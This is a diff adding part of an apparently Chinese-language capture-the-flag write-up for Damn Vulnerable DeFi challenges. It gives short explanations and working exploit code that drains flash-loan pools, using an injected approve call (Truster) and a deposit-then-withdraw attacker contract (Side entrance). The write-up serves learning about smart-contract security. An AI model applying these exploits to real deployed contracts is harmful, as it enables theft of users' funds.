@@ -32,3 +32,70 @@
      } 
      
   });  
+
+  ### 3.Truster
+  ##### call注入，data里调用approve给攻击者地址授权，然后再用transferfrom将钱转过来
+```
+  it('Exploit', async function () {
+    const data = web3.eth.abi.encodeFunctionCall({
+        name: 'approve',
+        type: 'function',
+        inputs: [{
+            type: 'address',
+            name: 'spender'
+        },{
+            type: 'uint256',
+            name: 'amount'
+        }]
+    }, [attacker, TOKENS_IN_POOL.toString()]); 
+
+    await this.pool.flashLoan(0, attacker, this.token.address, data);
+    await this.token.transferFrom(this.pool.address, attacker, TOKENS_IN_POOL, { from: attacker });
+});
+```
+### 4. Side entrance
+从贷款池中借出一定量的 ETH 并通过 deposit() 函数将这部分 ETH 存入，那么在满足 address(this).balance >= balanceBefore 的同时，balances[msg.sender] 也会增加。然后我们再通过 withdraw() 函数取出，即可顺利提空贷款池中的内部金额
+```
+interface IFlashLoanEtherReceiver {
+    function execute() external payable;
+}
+
+interface ISideEntranceLenderPool {
+    function deposit() external payable;
+    function withdraw() external;
+    function flashLoan(uint256 amount) external;
+}
+
+contract AttackSideEntrance is IFlashLoanEtherReceiver {
+    using Address for address payable;
+
+    ISideEntranceLenderPool pool;
+
+    function attack(ISideEntranceLenderPool _pool) public {
+        pool = _pool;
+        pool.flashLoan(address(_pool).balance);
+        pool.withdraw();
+        msg.sender.sendValue(address(this).balance);
+    }
+
+    function execute() external payable override {
+        pool.deposit{value:msg.value}();
+    }
+
+    receive() external payable{}
+}
+const AttackSideEntrance = contract.fromArtifact('AttackSideEntrance');
+// ...
+it('Exploit', async function () {
+    const attack = await AttackSideEntrance.new();
+    await attack.attack(this.pool.address, { from: attacker });
+});
+```
+
+### 5. The rewarder
+
+
+
+
+
+  
